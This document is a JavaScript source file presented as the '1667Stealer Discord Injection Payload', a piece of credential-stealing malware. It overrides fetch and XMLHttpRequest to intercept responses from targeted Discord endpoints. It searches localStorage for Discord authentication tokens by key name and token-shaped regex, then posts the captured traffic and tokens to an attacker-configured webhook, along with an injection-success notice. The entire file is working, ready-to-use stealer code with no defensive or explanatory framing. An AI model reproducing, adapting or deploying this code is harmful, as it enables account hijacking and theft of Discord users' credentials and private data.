// ============================================================
//  injection.js — 1667Stealer Discord Injection Payload
// ============================================================

const config = typeof CONFIG_OBF === "object" ? CONFIG_OBF : {};

(function () {
    "use strict";

    const originalFetch = window.fetch;

    function matchesPattern(url, pattern) {
        const regex = pattern
            .replace(/[.+?^${}()|[\]\\]/g, "\\$&")
            .replace(/\*/g, ".*");
        return new RegExp("^" + regex + "$").test(url);
    }

    async function sendWebhookData(url, body) {
        if (!config.apiurl) return;
        try {
            await originalFetch(config.apiurl, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    content: "🔔 **Discord event captured**\n```\nURL: " + url + "\n```",
                    embeds: [{
                        title: "Payload intercepted",
                        description: "```json\n" + String(body).slice(0, 1500) + "\n```",
                        color: 16711680,
                    }],
                }),
            });
        } catch (e) {}
    }

    function hookFetch() {
        window.fetch = function (...args) {
            const url = typeof args[0] === "string" ? args[0] : (args[0] && args[0].url);

            if (url && config.onCompleted && config.onCompleted.urls) {
                const matched = config.onCompleted.urls.some(p => matchesPattern(url, p));
                if (matched) {
                    return originalFetch.apply(this, args).then(async (response) => {
                        try {
                            const clone = response.clone();
                            const body = await clone.text();
                            sendWebhookData(url, body);
                        } catch (e) {}
                        return response;
                    });
                }
            }

            return originalFetch.apply(this, args);
        };
    }

    function grabTokens() {
        try {
            const tokens = [];
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                const value = localStorage.getItem(key);
                if (key && key.toLowerCase().includes("token")) {
                    tokens.push({ key: key, value: value });
                }
                if (value && typeof value === "string") {
                    const m = value.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/);
                    if (m) tokens.push({ key: key, value: m[0] });
                }
            }
            return tokens;
        } catch (e) {
            return [];
        }
    }

    async function init() {
        if (!config.apiurl) return;

        if (config["init-notify"] === "true") {
            try {
                await originalFetch(config.apiurl, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        content: "✅ **1667Stealer — Discord injected successfully**",
                    }),
                });
            } catch (e) {}
        }

        const tokens = grabTokens();
        if (tokens.length > 0) {
            try {
                await originalFetch(config.apiurl, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        content: "🔑 **Tokens from Discord localStorage**\n" +
                            tokens.map(t => "`" + t.value + "`").join("\n"),
                    }),
                });
            } catch (e) {}
        }
    }

    function hookXHR() {
        const originalOpen = XMLHttpRequest.prototype.open;
        const originalSend = XMLHttpRequest.prototype.send;

        XMLHttpRequest.prototype.open = function (method, url) {
            this._url = url;
            return originalOpen.apply(this, arguments);
        };

        XMLHttpRequest.prototype.send = function (body) {
            const self = this;
            this.addEventListener("load", function () {
                if (!config.onCompleted || !config.onCompleted.urls) return;
                const matched = config.onCompleted.urls.some(p => matchesPattern(self._url, p));
                if (matched) sendWebhookData(self._url, self.responseText);
            });
            return originalSend.apply(this, arguments);
        };
    }

    try {
        hookFetch();
        hookXHR();
        setTimeout(init, 5000);
    } catch (e) {}
})();
